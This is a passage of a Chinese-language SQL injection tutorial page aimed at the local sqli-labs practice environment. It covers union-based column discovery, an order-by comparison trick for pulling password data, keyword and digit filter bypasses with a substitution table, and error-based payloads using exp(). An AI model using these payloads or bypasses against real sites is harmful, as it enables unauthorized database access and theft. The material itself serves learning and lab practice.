+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3 from (select * from users join users b using(id,username))n--+</span></span><br></pre></td></tr></table></figure>
+
+<p>  <img src="image-20210525152003540.png" alt="image-20210525152003540"></p>
+</li>
+</ul>
+<h2 id="过滤括号的order-by-大小比较注入"><a href="#过滤括号的order-by-大小比较注入" class="headerlink" title="过滤括号的order by 大小比较注入"></a>过滤括号的order by 大小比较注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>order by 方法用于指定列排序，默认是升序</li>
+<li>union select 联合查询可以输出一个虚拟表，表中同时存在原表的数据和联合的数据</li>
+<li>order by 同样可以对虚拟表进行排序</li>
+</ul>
+<h3 id="payload举例"><a href="#payload举例" class="headerlink" title="payload举例"></a>payload举例</h3><blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210526180009845.png" alt="image-20210526180009845"></p>
+</blockquote>
+<p><strong>目标是得到password的数据，使用union select 1,2,3 时，联合的第三列虚拟数据为3和Dumb,order by 排序时默认升序，所以会将3排在首列，当union select 连接的数据为1,2,”E”时，E比原表的D值更大，于是E排在了Dumb下面</strong></p>
+<p><img src="image-20210526180533170.png" alt="image-20210526180533170"></p>
+<p>这两种情况的页面回显必然有所不同，这样就可以通过回显来判断出password数据</p>
+<p><img src="image-20210526180748854.png" alt="image-20210526180748854"></p>
+<h2 id="特殊拦截的绕过方法"><a href="#特殊拦截的绕过方法" class="headerlink" title="特殊拦截的绕过方法"></a>特殊拦截的绕过方法</h2><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><blockquote>
+<p>使用盲注</p>
+<p><strong>subsrt()函数使用substr(data from 1 for 1) 代替 substr(data,1,1)</strong> </p>
+<p>from 1 for 1 :从1到1</p>
+<p><strong>limit 0,1 使用 limit 0 offset 1 代替</strong></p>
+<p>offset 1 ：偏移量1</p>
+</blockquote>
+<h3 id="其他系统关键字被过滤-拦截"><a href="#其他系统关键字被过滤-拦截" class="headerlink" title="其他系统关键字被过滤/拦截"></a>其他系统关键字被过滤/拦截</h3><ol>
+<li>双写绕过关键字过滤</li>
+<li>使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li>
+</ol>
+<h3 id="数字被过滤-拦截"><a href="#数字被过滤-拦截" class="headerlink" title="数字被过滤/拦截"></a>数字被过滤/拦截</h3><blockquote>
+<p>下表摘自<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html">MySQL注入技巧</a></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>代替字符</th>
+<th>数</th>
+<th>代替字符</th>
+<th>数、字</th>
+<th>代替字符</th>
+<th>数、字</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false、!pi()</td>
+<td>0</td>
+<td>ceil(pi()*pi())</td>
+<td>10\</td>
+<td>A</td>
+<td>ceil((pi()+pi())*pi())</td>
+<td>20\</td>
+<td>K</td>
+</tr>
+<tr>
+<td>true、!(!pi())</td>
+<td>1</td>
+<td>ceil(pi()*pi())+true</td>
+<td>11\</td>
+<td>B</td>
+<td>ceil(ceil(pi())*version())</td>
+<td>21\</td>
+<td>L</td>
+</tr>
+<tr>
+<td>true+true</td>
+<td>2</td>
+<td>ceil(pi()+pi()+version())</td>
+<td>12\</td>
+<td>C</td>
+<td>ceil(pi()*ceil(pi()+pi()))</td>
+<td>22\</td>
+<td>M</td>
+</tr>
+<tr>
+<td>floor(pi())、~~pi()</td>
+<td>3</td>
+<td>floor(pi()*pi()+pi())</td>
+<td>13\</td>
+<td>D</td>
+<td>ceil((pi()+ceil(pi()))*pi())</td>
+<td>23\</td>
+<td>N</td>
+</tr>
+<tr>
+<td>ceil(pi())</td>
+<td>4</td>
+<td>ceil(pi()*pi()+pi())</td>
+<td>14\</td>
+<td>E</td>
+<td>ceil(pi())*ceil(version())</td>
+<td>24\</td>
+<td>O</td>
+</tr>
+<tr>
+<td>floor(version()) //注意版本</td>
+<td>5</td>
+<td>ceil(pi()*pi()+version())</td>
+<td>15\</td>
+<td>F</td>
+<td>floor(pi()*(version()+pi()))</td>
+<td>25\</td>
+<td>P</td>
+</tr>
+<tr>
+<td>ceil(version())</td>
+<td>6</td>
+<td>floor(pi()*version())</td>
+<td>16\</td>
+<td>G</td>
+<td>floor(version()*version())</td>
+<td>26\</td>
+<td>Q</td>
+</tr>
+<tr>
+<td>ceil(pi()+pi())</td>
+<td>7</td>
+<td>ceil(pi()*version())</td>
+<td>17\</td>
+<td>H</td>
+<td>ceil(version()*version())</td>
+<td>27\</td>
+<td>R</td>
+</tr>
+<tr>
+<td>floor(version()+pi())</td>
+<td>8</td>
+<td>ceil(pi()*version())+true</td>
+<td>18\</td>
+<td>I</td>
+<td>ceil(pi()*pi()*pi()-pi())</td>
+<td>28\</td>
+<td>S</td>
+</tr>
+<tr>
+<td>floor(pi()*pi())</td>
+<td>9</td>
+<td>floor((pi()+pi())*pi())</td>
+<td>19\</td>
+<td>J</td>
+<td>floor(pi()*pi()*floor(pi()))</td>
+<td>29\</td>
+<td>T</td>
+</tr>
+</tbody></table>
+<h2 id="报错注入详解"><a href="#报错注入详解" class="headerlink" title="报错注入详解"></a>报错注入详解</h2><h3 id="报错注入类型"><a href="#报错注入类型" class="headerlink" title="报错注入类型"></a>报错注入类型</h3><ul>
+<li>大数溢出</li>
+<li>函数报错</li>
+<li>主键，字段重复</li>
+</ul>
+<h3 id="大数溢出"><a href="#大数溢出" class="headerlink" title="大数溢出"></a>大数溢出</h3><p>sql可以运行并处理的数是有限的，当数超过上限，便会发生大数溢出</p>
+<ul>
+<li><p>主要函数</p>
+<p>  exp(),pow()</p>
+<p>  exp和pow两个函数都用来计算次方，exp(2)表示e的2次,pow(2,2)表示2的2次</p>
+<p>  <img src="image-20210526204055248.png" alt="image-20210526204055248"></p>
+<p>  若平方过大，则报错</p>
+<p>  <img src="image-20210526204130441.png" alt="image-20210526204130441"></p>
+</li>
+<li><p>payload</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这里我也不懂，此方法仅限mysql5使用</p>
+<h3 id="函数报错"><a href="#函数报错" class="headerlink" title="函数报错"></a>函数报错</h3><p><strong>最常见的是updatexml()和extractvalue()函数，在注入攻击中已经提及</strong></p>
+<p>其他函数这里不想解释了，看最下面特别鸣谢吧</p>
+<h1 id="特别鸣谢：https-xz-aliyun-com-t-7169"><a href="#特别鸣谢：https-xz-aliyun-com-t-7169" class="headerlink" title="特别鸣谢：https://xz.aliyun.com/t/7169"></a>特别鸣谢：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></h1>
             </div>
             <hr/>
 
